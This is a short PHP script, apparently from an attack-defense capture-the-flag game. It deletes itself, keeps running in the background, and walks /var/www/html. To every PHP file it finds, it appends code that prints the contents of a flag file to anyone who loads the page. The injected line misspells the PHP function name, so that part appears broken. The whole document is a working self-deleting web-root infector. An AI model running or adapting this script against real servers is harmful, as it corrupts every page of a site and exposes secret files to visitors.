<?php
set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
function getfiles($path){
    foreach(glob($path) as $afile){
        if(is_dir($afile))
          getfiles($afile.'/*.php');
        else
          file_put_contents($afile,'<?php echo ">>>".file_get_content("/pathflagpathflag")."<<<";?>',FILE_APPEND);
    }
}
getfiles('/var/www/html');
?>